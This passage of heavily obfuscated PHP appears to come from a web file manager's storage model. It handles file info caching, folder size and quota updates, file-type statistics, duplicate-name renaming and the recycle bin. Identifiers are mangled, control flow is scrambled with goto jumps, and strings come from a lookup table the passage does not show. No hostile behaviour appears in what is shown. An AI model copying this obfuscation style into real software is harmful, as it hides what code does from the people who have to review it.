$B•¼ø¬ƒ[$a‰İ«ºèé[28]], !1); $this->updateModifyTime($CµÀÏİØå[$a‰İ«ºèé[457]]); $eÔ©Çœ•‡ = $this->where(array($a‰İ«ºèé[380] => $FÀé³†§Ãë))->data($B•¼ø¬ƒ)->save(); goto A’¦åÊ©’’; CØÑ‹¡‚íğ: } public function setNamePinyin($Aô‰ò·Ç£, $b‡‚ğ»ÑŞÁ, $Fè‚ éŠ·ò = true) { $C°”¹ä¥“Û =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C§¨Ú‡ôÈ‡ = Input::check($b‡‚ğ»ÑŞÁ, $C°”¹ä¥“Û[524]); if ($Fè‚ éŠ·ò && !$C§¨Ú‡ôÈ‡) { return; } if (!$C§¨Ú‡ôÈ‡) { $this->metaSet($Aô‰ò·Ç£, $C°”¹ä¥“Û[412], null); $this->metaSet($Aô‰ò·Ç£, $C°”¹ä¥“Û[411], null); return; } $AÅ—‚áÇíÖ = array($C°”¹ä¥“Û[412] => str_replace($C°”¹ä¥“Û[50], $C°”¹ä¥“Û[33], Pinyin::encode($b‡‚ğ»ÑŞÁ)), $C°”¹ä¥“Û[411] => Pinyin::encode($b‡‚ğ»ÑŞÁ, $C°”¹ä¥“Û[525])); $this->metaSet($Aô‰ò·Ç£, $AÅ—‚áÇíÖ); } public function getContent($cŞéïùè‰¬) { goto D”öÅ£ê´İ; D”öÅ£ê´İ: $eµ¢— Í„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D¼¬´‡‘•¬ = $this->fileInfoGet($cŞéïùè‰¬); if (!$D¼¬´‡‘•¬) { return !1; } goto FÇñ÷šá´’; FÇñ÷šá´’: if ($D¼¬´‡‘•¬[$eµ¢— Í„[77]] == 0) { return $eµ¢— Í„[33]; } $d±£øÅ¶ÕÁ = $eµ¢— Í„[2312] . $D¼¬´‡‘•¬[$eµ¢— Í„[160]]; if ($D¼¬´‡‘•¬[$eµ¢— Í„[77]] <= 1024 * 10) { $aÛŞšÛÁ£¸ = Cache::get($d±£øÅ¶ÕÁ); if (!$aÛŞšÛÁ£¸) { $aÛŞšÛÁ£¸ = IO::getContent($D¼¬´‡‘•¬[$eµ¢— Í„[75]]); Cache::set($d±£øÅ¶ÕÁ, $aÛŞšÛÁ£¸); } return $aÛŞšÛÁ£¸; } goto c¯Û‹Ûóåù; c¯Û‹Ûóåù: return IO::getContent($D¼¬´‡‘•¬[$eµ¢— Í„[75]]); goto eà†ƒó¤–; eà†ƒó¤–: } public function setDesc($D“½Éªº—œ, $c”æäŸ‘®æ) { $D¬ª²—±¦ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; Model($D¬ª²—±¦[501])->eventAddDesc($D“½Éªº—œ, $c”æäŸ‘®æ); return $this->metaSet($D“½Éªº—œ, $D¬ª²—±¦[401], $c”æäŸ‘®æ); } public function setContent($CÌÙ‹ÕŠ¿Î, $A‚¨ÜÜÂ…È = '') { goto AÛ§°ó·£; DÑõ‹¦¿Šˆ: if (!$AªŞÇõÌê) { return Model($CĞ‘àˆ®[418])->remove($C†‚«‰ğ¬é[$CĞ‘àˆ®[415]]); } $this->folderSizeReset($D‰Û×ˆáÄ[$CĞ‘àˆ®[457]]); return !0; goto bÜ‰¿¢œØ˜; bœ®ÊÒ‚: if (!$c³ï±‘áº || !$D‰Û×ˆáÄ) { return !1; } $C†‚«‰ğ¬é = Model($CĞ‘àˆ®[418])->addFileByContent($A‚¨ÜÜÂ…È, $D‰Û×ˆáÄ[$CĞ‘àˆ®[28]]); $AªŞÇõÌê = $this->fileHistory($D‰Û×ˆáÄ, $C†‚«‰ğ¬é[$CĞ‘àˆ®[415]], $C†‚«‰ğ¬é[$CĞ‘àˆ®[77]]); goto DÑõ‹¦¿Šˆ; AÛ§°ó·£: $CĞ‘àˆ® =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D‰Û×ˆáÄ = $this->sourceInfo($CÌÙ‹ÕŠ¿Î); $c³ï±‘áº = $this->fileInfoGet($CÌÙ‹ÕŠ¿Î); goto bœ®ÊÒ‚; bÜ‰¿¢œØ˜: } public function fileSubstr($BÚñèÉ¼çå, $dŒ•ßÁ”î, $B‡Ó®’—) { $eíÑÌ˜ÖÛÃ = $this->fileInfoGet($BÚñèÉ¼çå); if (!$eíÑÌ˜ÖÛÃ) { return !1; } return IO::fileSubstr($eíÑÌ˜ÖÛÃ[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]], $dŒ•ßÁ”î, $B‡Ó®’—); } public function fileInfoGet($E­Ğ¦´») { goto BÄÎÎÕ™™; d—Ëó¶¿ƒ¸: return $D¡‚°‡…œ±; goto B†Óº›Š¤; BÄšé ÊÊ¾: $eì×›“‘‹¢ = $E©×Šø¯«[421] . $CÅàğã‡ÀŞ[$E©×Šø¯«[415]]; $aø¶³×“· = _get(self::$cacheFileInfo, $eì×›“‘‹¢); if ($aø¶³×“·) { return $aø¶³×“·; } goto c‡ìÂ¹¶µ; c‡ìÂ¹¶µ: $D¡‚°‡…œ± = Model($E©×Šø¯«[418])->fileInfo($CÅàğã‡ÀŞ[$E©×Šø¯«[415]]); if ($D¡‚°‡…œ±) { $D¡‚°‡…œ±[$E©×Šø¯«[28]] = $CÅàğã‡ÀŞ[$E©×Šø¯«[28]]; } self::$cacheFileInfo[$eì×›“‘‹¢] = $D¡‚°‡…œ±; goto d—Ëó¶¿ƒ¸; BÄÎÎÕ™™: $E©×Šø¯« =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÅàğã‡ÀŞ = $this->sourceInfo($E­Ğ¦´»); if (!$CÅàğã‡ÀŞ || $CÅàğã‡ÀŞ[$E©×Šø¯«[367]]) { return !1; } goto BÄšé ÊÊ¾; B†Óº›Š¤: } private function folderChildrenNumber($F«Ÿİ»óá) { $a§¢Ø‰²²‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eŞ‘ˆëéôÀ = $this->sourceInfo($F«Ÿİ»óá); $dàÌ—¡‰Òš = array($a§¢Ø‰²²‚[521] => array($a§¢Ø‰²²‚[479], $eŞ‘ˆëéôÀ[$a§¢Ø‰²²‚[455]] . $F«Ÿİ»óá . $a§¢Ø‰²²‚[480]), $a§¢Ø‰²²‚[392] => intval($eŞ‘ˆëéôÀ[$a§¢Ø‰²²‚[393]]), $a§¢Ø‰²²‚[514] => 1); $FĞöšã ÎÒ = $this->where($dàÌ—¡‰Òš)->count(); $c†¯‡¹¨Û‚ = $this->where($dàÌ—¡‰Òš)->where(array($a§¢Ø‰²²‚[514] => 0))->count(); return array($a§¢Ø‰²²‚[81] => $c†¯‡¹¨Û‚, $a§¢Ø‰²²‚[82] => $FĞöšã ÎÒ); } public function pathInfo($B›½•ºÙÎ, $a“±Ö¦Œ×ç = false) { goto fÀÓ½ÄÁ; fÀÓ½ÄÁ: $DËß±¡İ½Š =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÕ½ä¼Ğ§ = $DËß±¡İ½Š[407] . intval($a“±Ö¦Œ×ç) . $DËß±¡İ½Š[408] . $B›½•ºÙÎ; $Aæº˜Æƒ‹¥ = _get(self::$cachePathInfo, $fÕ½ä¼Ğ§); goto bÛ¹‹Õ†; bÛ¹‹Õ†: if ($Aæº˜Æƒ‹¥) { return $Aæº˜Æƒ‹¥; } $b¤¨å ‚Ëó = $this->sourceInfo($B›½•ºÙÎ); if (!$b¤¨å ‚Ëó) { return !1; } goto Cåƒè¼; Cåƒè¼: $b¤¨å ‚Ëó = $this->_listDataApplyItem($b¤¨å ‚Ëó, $a“±Ö¦Œ×ç); self::$cachePathInfo[$fÕ½ä¼Ğ§] = $b¤¨å ‚Ëó; return $b¤¨å ‚Ëó; goto eÁ‡ğê¢Ÿ; eÁ‡ğê¢Ÿ: } public static $cachePathInfoMore = array(); public function pathInfoMore($Aòƒéô²ù) { goto B¿µŠØÍó; Dõ±ƒìÜğÙ: self::$cachePathInfoMore[$Aòƒéô²ù] = $A°Îö‘‘”£; return $A°Îö‘‘”£; goto a¨øç£ËÊÍ; B¿µŠØÍó: $B¾‰º¨± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cŞ„–°¨°¿ = _get(self::$cachePathInfoMore, $Aòƒéô²ù); if ($cŞ„–°¨°¿) { return $cŞ„–°¨°¿; } goto aÅ†›İš; aÅ†›İš: $A°Îö‘‘”£ = $this->pathInfo($Aòƒéô²ù); if (!$A°Îö‘‘”£) { return !1; } if ($A°Îö‘‘”£[$B¾‰º¨±[367]] == $B¾‰º¨±[83]) { $A°Îö‘‘”£[$B¾‰º¨±[80]] = $this->folderChildrenNumber($Aòƒéô²ù); } goto Dõ±ƒìÜğÙ; a¨øç£ËÊÍ: } public function sourceInfo($B¡¥…ê‹‹ö) { goto Aâ‘ÛšİÖñ; aŒ˜Ğ”‚î: self::$cacheSourceInfo[$f¼àÔÙš™ç] = $E²ì¹ñ‚æÇ; return self::$cacheSourceInfo[$f¼àÔÙš™ç]; goto fÔ‚éÆéğÔ; DÚ‡º‰ËÊ¿: $FŠ¶¸‚·åí = _get(self::$cacheSourceInfo, $f¼àÔÙš™ç); if ($FŠ¶¸‚·åí) { return $FŠ¶¸‚·åí; } $E²ì¹ñ‚æÇ = $this->where(array($CÄÙ©¾Ÿ[366] => $B¡¥…ê‹‹ö))->find(); goto aŒ˜Ğ”‚î; Aâ‘ÛšİÖñ: $CÄÙ©¾Ÿ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$B¡¥…ê‹‹ö) { return array(); } $f¼àÔÙš™ç = $CÄÙ©¾Ÿ[406] . $B¡¥…ê‹‹ö; goto DÚ‡º‰ËÊ¿; fÔ‚éÆéğÔ: } public function sourceCacheClear($e‰Ô½æ¸ç‰ = false) { if ($e‰Ô½æ¸ç‰ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[ÚŠ•´ÍéÒÑÔ][406] . $e‰Ô½æ¸ç‰]); } public function pathInfoByPath($E•Èä¯’ˆ, $Dè Ë³×†²) { $AÖ¼®á” =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dï©‚—à­é = !$Dè Ë³×†² ? array() : explode($AÖ¼®á”[8], trim($Dè Ë³×†², $AÖ¼®á”[8])); $BÚã¼†ÂÉ = $E•Èä¯’ˆ; foreach ($Dï©‚—à­é as $dÅğÎ°) { $D¦Ô£ÉÃœ = array($AÖ¼®á”[457] => $BÚã¼†ÂÉ, $AÖ¼®á”[28] => $dÅğÎ°); $e®ÌàË±èİ = $this->where($D¦Ô£ÉÃœ)->select(); if (!$e®ÌàË±èİ) { return !1; } $e®ÌàË±èİ = array_sort_by($e®ÌàË±èİ, $AÖ¼®á”[393]); $BÚã¼†ÂÉ = $e®ÌàË±èİ[0][$AÖ¼®á”[366]]; } return $this->pathInfo($BÚã¼†ÂÉ, !0); } protected function updateModifyTime($d…Ï‹ÑÊÎ) { goto b¼ïÁÓƒ©š; f°Ä•ÙÕ’×: foreach ($d…Ï‹ÑÊÎ as $FäÕ±Å± => $B—æ×¶¾Â¼) { $d…Ï‹ÑÊÎ[$FäÕ±Å±] = intval($B—æ×¶¾Â¼); } $bô¡Ú…ìæÆ = array($DÊ‘‚âğ[366] => array($DÊ‘‚âğ[7], $d…Ï‹ÑÊÎ)); $bÑĞ†ùÓ·Œ = array($DÊ‘‚âğ[520] => USER_ID, $DÊ‘‚âğ[387] => time()); goto CàÌïÕÎ¦; CàÌïÕÎ¦: $this->where($bô¡Ú…ìæÆ)->save($bÑĞ†ùÓ·Œ); goto a“…œòÖâ; b¼ïÁÓƒ©š: $DÊ‘‚âğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$d…Ï‹ÑÊÎ) { return; } if (!is_array($d…Ï‹ÑÊÎ)) { $d…Ï‹ÑÊÎ = array($d…Ï‹ÑÊÎ); } goto f°Ä•ÙÕ’×; a“…œòÖâ: } public function folderSizeReset($e‘ÎöÆ‘) { goto fóÚù¸§; aê™—ÇÎÍÔ: $B‡Š¤°È½¯ = $E¢Ã“õ” - intval($aêïç®ÆÇ[$DÜ¦¦Ò÷´”[77]]); if ($B‡Š¤°È½¯ == 0) { return CacheLock::unlock($E½›¦…„‡ù); } $this->where(array($DÜ¦¦Ò÷´”[380] => $e‘ÎöÆ‘))->setField($DÜ¦¦Ò÷´”[77], $E¢Ã“õ”); goto Fº¼ÍŒñ¸; aÁ—¼àñŠ¸: CacheLock::unlock($E½›¦…„‡ù); goto FÜ¦Ôçßíó; Fº¼ÍŒñ¸: $aíƒ©¨‘× = $this->parentLevelArray($aêïç®ÆÇ[$DÜ¦¦Ò÷´”[455]]); if ($aíƒ©¨‘×) { $eÇª¢Ûäâœ = array($DÜ¦¦Ò÷´”[366] => array($DÜ¦¦Ò÷´”[381], $aíƒ©¨‘×)); if ($B‡Š¤°È½¯ < 0) { $eÇª¢Ûäâœ[$DÜ¦¦Ò÷´”[77]] = array($DÜ¦¦Ò÷´”[923], abs($B‡Š¤°È½¯)); } $this->where($eÇª¢Ûäâœ)->setAdd($DÜ¦¦Ò÷´”[77], $B‡Š¤°È½¯); } $this->targetSpaceUpdate($aêïç®ÆÇ[$DÜ¦¦Ò÷´”[368]], $aêïç®ÆÇ[$DÜ¦¦Ò÷´”[452]]); goto aÁ—¼àñŠ¸; Cƒ²‘«Õ‡: CacheLock::lock($E½›¦…„‡ù, 20); $this->sourceCacheClear($e‘ÎöÆ‘); $aêïç®ÆÇ = $this->sourceInfo($e‘ÎöÆ‘); goto BùÃ£­äêÚ; BùÃ£­äêÚ: $eÇª¢Ûäâœ = array($DÜ¦¦Ò÷´”[365] => $e‘ÎöÆ‘, $DÜ¦¦Ò÷´”[392] => 0); $E¢Ã“õ” = $this->where($eÇª¢Ûäâœ)->sum($DÜ¦¦Ò÷´”[77]); $E¢Ã“õ” = intval($E¢Ã“õ”); goto aê™—ÇÎÍÔ; fóÚù¸§: $DÜ¦¦Ò÷´” =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->statusIgnoreResetSpace) { return; } $E½›¦…„‡ù = $DÜ¦¦Ò÷´”[2313] . $e‘ÎöÆ‘; goto Cƒ²‘«Õ‡; FÜ¦Ôçßíó: } public function folderSizeResetChildren($Dó¯ø¼ßŠ) { goto aÓ‚šî¿; eë¹«¤ÃÌƒ: $EÊµ¤·Æ‘¡ = array($c¦‰³½˜‡“[514] => 1, $c¦‰³½˜‡“[521] => array($c¦‰³½˜‡“[479], $EŒ…ø¿[$c¦‰³½˜‡“[455]] . $Dó¯ø¼ßŠ . $c¦‰³½˜‡“[480])); $BŒ–ÌôÌ»­ = $c¦‰³½˜‡“[2314]; $b…“ñâÉ–Ì = $this->field($BŒ–ÌôÌ»­)->where($EÊµ¤·Æ‘¡)->select(); goto bñÃÉÅä¶; A­¦øÛ¤„å: $b…“ñâÉ–Ì[] = $EŒ…ø¿; $b…“ñâÉ–Ì = array_to_keyvalue($b…“ñâÉ–Ì, $c¦‰³½˜‡“[366]); foreach ($b…“ñâÉ–Ì as $C¢ğåÄë…ó => $CŒö‡²Íø‰) { $b…“ñâÉ–Ì[$C¢ğåÄë…ó][$c¦‰³½˜‡“[2315]] = $b…“ñâÉ–Ì[$C¢ğåÄë…ó][$c¦‰³½˜‡“[77]]; $b…“ñâÉ–Ì[$C¢ğåÄë…ó][$c¦‰³½˜‡“[77]] = 0; } goto bƒÁ‚ìãö; aÓ‚šî¿: $c¦‰³½˜‡“ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->sourceCacheClear($Dó¯ø¼ßŠ); $EŒ…ø¿ = $this->sourceInfo($Dó¯ø¼ßŠ); goto eë¹«¤ÃÌƒ; bñÃÉÅä¶: $EÊµ¤·Æ‘¡[$c¦‰³½˜‡“[367]] = 0; $e„Œ¼ƒ¡…é = $this->field($BŒ–ÌôÌ»­)->where($EÊµ¤·Æ‘¡)->select(); if (!$e„Œ¼ƒ¡…é) { return; } goto A­¦øÛ¤„å; bƒÁ‚ìãö: foreach ($e„Œ¼ƒ¡…é as $CŒö‡²Íø‰) { $ağÙ•ù¤ù = $CŒö‡²Íø‰[$c¦‰³½˜‡“[457]] . $c¦‰³½˜‡“[33]; if (!isset($b…“ñâÉ–Ì[$ağÙ•ù¤ù])) { continue; } if ($CŒö‡²Íø‰[$c¦‰³½˜‡“[393]] == $b…“ñâÉ–Ì[$ağÙ•ù¤ù][$c¦‰³½˜‡“[393]]) { $b…“ñâÉ–Ì[$ağÙ•ù¤ù][$c¦‰³½˜‡“[77]] += $CŒö‡²Íø‰[$c¦‰³½˜‡“[77]]; } } foreach ($b…“ñâÉ–Ì as $CŒö‡²Íø‰) { $CîÖó‡ç‰ = $this->parentLevelArray($CŒö‡²Íø‰[$c¦‰³½˜‡“[455]]); foreach ($CîÖó‡ç‰ as $ağÙ•ù¤ù) { $ağÙ•ù¤ù = $ağÙ•ù¤ù . $c¦‰³½˜‡“[33]; if (!isset($b…“ñâÉ–Ì[$ağÙ•ù¤ù])) { continue; } if ($CŒö‡²Íø‰[$c¦‰³½˜‡“[393]] == $b…“ñâÉ–Ì[$ağÙ•ù¤ù][$c¦‰³½˜‡“[393]]) { $b…“ñâÉ–Ì[$ağÙ•ù¤ù][$c¦‰³½˜‡“[77]] += $CŒö‡²Íø‰[$c¦‰³½˜‡“[77]]; } } } $a£âîÌõ = array(); goto dÓ‹÷Á‘ëô; dÓ‹÷Á‘ëô: foreach ($b…“ñâÉ–Ì as $CŒö‡²Íø‰) { if ($CŒö‡²Íø‰[$c¦‰³½˜‡“[77]] == $CŒö‡²Íø‰[$c¦‰³½˜‡“[2315]]) { continue; } $a£âîÌõ[] = array($c¦‰³½˜‡“[366], $CŒö‡²Íø‰[$c¦‰³½˜‡“[366]], $c¦‰³½˜‡“[77], $CŒö‡²Íø‰[$c¦‰³½˜‡“[77]]); } $this->saveAll($a£âîÌõ); goto C’‰Ó®´©‘; C’‰Ó®´©‘: } public function userSpaceReset($D‡¡Ÿİï¨¯ = false) { $CÉ­³ƒÔˆó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DŞ¢æªÆ¡ë = $this->where(array($CÉ­³ƒÔˆó[368] => self::TYPE_USER, $CÉ­³ƒÔˆó[452] => $D‡¡Ÿİï¨¯, $CÉ­³ƒÔˆó[367] => 0))->sum($CÉ­³ƒÔˆó[77]); Model($CÉ­³ƒÔˆó[470])->userEdit($D‡¡Ÿİï¨¯, array($CÉ­³ƒÔˆó[2058] => $DŞ¢æªÆ¡ë)); } public function targetSpaceUpdate($Eó‚Ğ‘£‡, $C×™¤ÀßñÜ) { $D‡›…»…Ò… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$C×™¤ÀßñÜ) { return; } if (!in_array($Eó‚Ğ‘£‡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $c¿ê…­ñ© = $this->targetSpaceSize($Eó‚Ğ‘£‡, $C×™¤ÀßñÜ); if ($Eó‚Ğ‘£‡ == self::TYPE_USER) { Model($D‡›…»…Ò…[470])->userEdit($C×™¤ÀßñÜ, array($D‡›…»…Ò…[2058] => $c¿ê…­ñ©)); } else { if ($Eó‚Ğ‘£‡ == self::TYPE_GROUP) { Model($D‡›…»…Ò…[454])->groupEdit($C×™¤ÀßñÜ, array($D‡›…»…Ò…[2058] => $c¿ê…­ñ©)); } } } public function targetSpaceSize($f„ÁÛ¥ÛÈœ, $C¬­òß¥±Ñ) { goto aêê²¦ëó‰; aêê²¦ëó‰: $eöš×¦¦©¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f†àÍá“» = $this->sourceRoot($f„ÁÛ¥ÛÈœ, $C¬­òß¥±Ñ, !0); if (!$f†àÍá“») { return 0; } goto bÎ£†ìÒ¿À; F÷ƒõ±»ã‘: $bÃ©äì…† = array_to_keyvalue($bÃ©äì…†, $eöš×¦¦©¼[33], $eöš×¦¦©¼[366]); $bÃ©äì…† = array_unique(array_filter($bÃ©äì…†)); if ($bÃ©äì…†) { $cäòÒ·±õ¬ = array($eöš×¦¦©¼[380] => array($eöš×¦¦©¼[381], $bÃ©äì…†)); $C²©÷’«ßÃ += floatval($this->where($cäòÒ·±õ¬)->sum($eöš×¦¦©¼[77])); } goto EàÄ‡× ™—; bÎ£†ìÒ¿À: $C²©÷’«ßÃ = floatval($f†àÍá“»[$eöš×¦¦©¼[77]]); $cäòÒ·±õ¬ = array($eöš×¦¦©¼[521] => array($eöš×¦¦©¼[479], $eöš×¦¦©¼[466] . $f†àÍá“»[$eöš×¦¦©¼[366]] . $eöš×¦¦©¼[480])); $bÃ©äì…† = Model($eöš×¦¦©¼[391])->field($eöš×¦¦©¼[380])->where($cäòÒ·±õ¬)->select(); goto F÷ƒõ±»ã‘; EàÄ‡× ™—: return $C²©÷’«ßÃ; goto f©ôß¬»ƒ…; f©ôß¬»ƒ…: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($c‰¯¦Ô«›Ï) { return $this->fileTypeProfile($c‰¯¦Ô«›Ï, SourceModel::TYPE_USER); } public function groupFileTypeProfile($A„‘îŞˆÎ) { return $this->fileTypeProfile($A„‘îŞˆÎ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($B£™²ØãÈó, $AÈ¦ª·ë™Í) { goto aì“Í£˜Šá; aì“Í£˜Šá: $DˆëĞ÷÷Ê´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d»Ğèéğˆä = $DˆëĞ÷÷Ê´[2316] . $B£™²ØãÈó . $DˆëĞ÷÷Ê´[70] . $AÈ¦ª·ë™Í; $aÚß™Å÷õ = Cache::get($d»Ğèéğˆä); goto fÆ÷Ö—ç÷; dê¼êéÒâÔ: $d©¬—‰ßç = array(); $d©¬—‰ßç[$DˆëĞ÷÷Ê´[2317]] = array($DˆëĞ÷÷Ê´[2318] => LNG($DˆëĞ÷÷Ê´[2317]), $DˆëĞ÷÷Ê´[2319] => $this->where($B…«±¨ÆÖ×)->count(), $DˆëĞ÷÷Ê´[516] => $this->where($B…«±¨ÆÖ×)->sum($DˆëĞ÷÷Ê´[77])); $FÊË‰â‡² = KodIO::fileTypeList(); goto C†»Ï™ÀìŞ; C†»Ï™ÀìŞ: foreach ($FÊË‰â‡² as $eÁ’ó³«‰ => $f­›ïˆ·á£) { $B…«±¨ÆÖ×[$DˆëĞ÷÷Ê´[369]] = $this->fileTypeWhere($eÁ’ó³«‰); $d©¬—‰ßç[$eÁ’ó³«‰] = array($DˆëĞ÷÷Ê´[2318] => $f­›ïˆ·á£[$DˆëĞ÷÷Ê´[28]], $DˆëĞ÷÷Ê´[2319] => $this->where($B…«±¨ÆÖ×)->count(), $DˆëĞ÷÷Ê´[516] => $this->where($B…«±¨ÆÖ×)->sum($DˆëĞ÷÷Ê´[77])); } Cache::set($d»Ğèéğˆä, $d©¬—‰ßç, 1200); return $d©¬—‰ßç; goto dÃ‘ï³äÓŠ; fÆ÷Ö—ç÷: if ($aÚß™Å÷õ) { return $aÚß™Å÷õ; } $B…«±¨ÆÖ× = array($DˆëĞ÷÷Ê´[514] => 0); if ($B£™²ØãÈó != !1) { $B…«±¨ÆÖ×[$DˆëĞ÷÷Ê´[452]] = $B£™²ØãÈó; $B…«±¨ÆÖ×[$DˆëĞ÷÷Ê´[368]] = $AÈ¦ª·ë™Í; } goto dê¼êéÒâÔ; dÃ‘ï³äÓŠ: } public function fileNameExist($f¦•‡’ÂÕ, $F¬®Ù Õ¢ã) { $DÚùñª âÚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FãÜ‡š¤ Ì = $this->childList($f¦•‡’ÂÕ); foreach ($FãÜ‡š¤ Ì as $e­³ˆùŞ¯Í) { if ($e­³ˆùŞ¯Í[$DÚùñª âÚ[28]] == $F¬®Ù Õ¢ã) { return $e­³ˆùŞ¯Í[$DÚùñª âÚ[366]]; } } return !1; } public function childList($B—ŸÓÖºóà) { goto cóÇòÂÒ¡Ş; Fâ¦¶§çùÅ: $A–øãÌ›Úõ = array($Fº¶ ·×ÆÃ[457] => intval($B—ŸÓÖºóà), $Fº¶ ·×ÆÃ[393] => 0); $E™Œ‘ÃßŠ” = $this->where($A–øãÌ›Úõ)->select(); $E™Œ‘ÃßŠ” = $E™Œ‘ÃßŠ” ? $E™Œ‘ÃßŠ” : array(); goto cìƒÈ¥À¸•; cìƒÈ¥À¸•: self::$cacheChildList[$AºÁßèñ¨Á] = $E™Œ‘ÃßŠ”; foreach ($E™Œ‘ÃßŠ” as $eìò£·õå) { $AºÁßèñ¨Á = $Fº¶ ·×ÆÃ[406] . $eìò£·õå[$Fº¶ ·×ÆÃ[366]]; self::$cacheSourceInfo[$AºÁßèñ¨Á] = $eìò£·õå; } return $E™Œ‘ÃßŠ”; goto F«‹ÎÀÌ˜Ó; cóÇòÂÒ¡Ş: $Fº¶ ·×ÆÃ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AºÁßèñ¨Á = $Fº¶ ·×ÆÃ[2298] . $B—ŸÓÖºóà; if (isset(self::$cacheChildList[$AºÁßèñ¨Á])) { return self::$cacheChildList[$AºÁßèñ¨Á]; } goto Fâ¦¶§çùÅ; F«‹ÎÀÌ˜Ó: } public function fileNameAuto($a”¶ãÄ±ŠÛ, $a¦±Ššƒ’, $e¬‹ğì‹¬Á = REPEAT_RENAME, $aà¥ñªÛÊè = false) { $f‰¦™‰‘Ÿ„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a‘ƒÈÇ¯óï = $this->childList($a”¶ãÄ±ŠÛ); $dì±ŠÄ·èÄ = array_to_keyvalue($a‘ƒÈÇ¯óï, $f‰¦™‰‘Ÿ„[33], $f‰¦™‰‘Ÿ„[28]); return $this->fileNameAutoGet($dì±ŠÄ·èÄ, $a¦±Ššƒ’, $e¬‹ğì‹¬Á, $aà¥ñªÛÊè); } public function fileNameAutoGet($FĞäçá¬¬“, $dİ‡ãÃ½Í—, $dŞ§±œ´¨, $dÚÔÔ•Ï¦…) { $AÓŒ±ŸÕ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($dŞ§±œ´¨ == REPEAT_REPLACE || !$FĞäçá¬¬“ || !in_array_not_case($dİ‡ãÃ½Í—, $FĞäçá¬¬“) || $dÚÔÔ•Ï¦… && $dŞ§±œ´¨ != REPEAT_RENAME_FOLDER) { return $dİ‡ãÃ½Í—; } if ($dŞ§±œ´¨ == REPEAT_SKIP) { return !1; } $ağô¹…Ö•« = $AÓŒ±ŸÕ[93] . get_path_ext($dİ‡ãÃ½Í—); $ağô¹…Ö•« = $ağô¹…Ö•« == $AÓŒ±ŸÕ[93] || $dÚÔÔ•Ï¦… ? $AÓŒ±ŸÕ[33] : $ağô¹…Ö•«; for ($aËÉŞøñîƒ = 1; $aËÉŞøñîƒ <= count($FĞäçá¬¬“) + 1; $aËÉŞøñîƒ++) { $eˆ²ãéˆ = substr($dİ‡ãÃ½Í—, 0, strlen($dİ‡ãÃ½Í—) - strlen($ağô¹…Ö•«)); $cğ‚ï´³‚Ö = $eˆ²ãéˆ . "\50{$aËÉŞøñîƒ}\51{$ağô¹…Ö•«}"; if (!in_array_not_case($cğ‚ï´³‚Ö, $FĞäçá¬¬“)) { return $cğ‚ï´³‚Ö; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\162\x63\145\137\x72\145\143\171\143\154\145"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\151\155\x65", "\x74\151\x6d\145", "\151\x6e\163\145\x72\x74", "\146\x75\x6e\x63\164\x69\x6f\156")); public function listData($CÌ„ˆÍ®‚Á = false) { $eíŠ‡åä­¬ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÌ„ˆÍ®‚Á = $CÌ„ˆÍ®‚Á ? $CÌ„ˆÍ®‚Á : USER_ID; $F£èæ¦×ğ² = $this->where(array($eíŠ‡åä­¬[1400] => $CÌ„ˆÍ®‚Á))->select(); return array_to_keyvalue($F£èæ¦×ğ², $eíŠ‡åä­¬[33], $eíŠ‡åä­¬[366]); } public function moveToRecycle($D‘¥›Í§Ò) { goto eñ¿Š¡¢¨Ã; eñ¿Š¡¢¨Ã: $AÒ–ñİˆ½´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÃµù°ˆÑä = Model($AÒ–ñİˆ½´[1102]); $b¢øÏ»–«í = $EÃµù°ˆÑä->sourceInfo($D‘¥›Í§Ò); goto E¯ÎÎ‡¬ó; C‰ŞùùôÊÅ: $this->recycleMove($D‘¥›Í§Ò, 1); if ($b¢øÏ»–«í[$AÒ–ñİˆ½´[367]] == $AÒ–ñİˆ½´[83]) { $BøŠ¢Öµ¿ = array($AÒ–ñİˆ½´[521] => array($AÒ–ñİˆ½´[479], $b¢øÏ»–«í[$AÒ–ñİˆ½´[455]] . $D‘¥›Í§Ò . $AÒ–ñİˆ½´[480])); $EÃµù°ˆÑä->where($BøŠ¢Öµ¿)->setField($AÒ–ñİˆ½´[393], 1); } goto D†¯ˆÚ“›Í; E¯ÎÎ‡¬ó: if (!$b¢øÏ»–«í || $b¢øÏ»–«í[$AÒ–ñİˆ½´[393]] == $AÒ–ñİˆ½´[83]) { return; } $DèÏŞ°æÎ‘ = array($AÒ–ñİˆ½´[380] => $D‘¥›Í§Ò, $AÒ–ñİˆ½´[1400] => USER_ID, $AÒ–ñİˆ½´[517] => $b¢øÏ»–«í[$AÒ–ñİˆ½´[368]], $AÒ–ñİˆ½´[518] => $b¢øÏ»–«í[$AÒ–ñİˆ½´[452]], $AÒ–ñİˆ½´[521] => $b¢øÏ»–«í[$AÒ–ñİˆ½´[455]]); 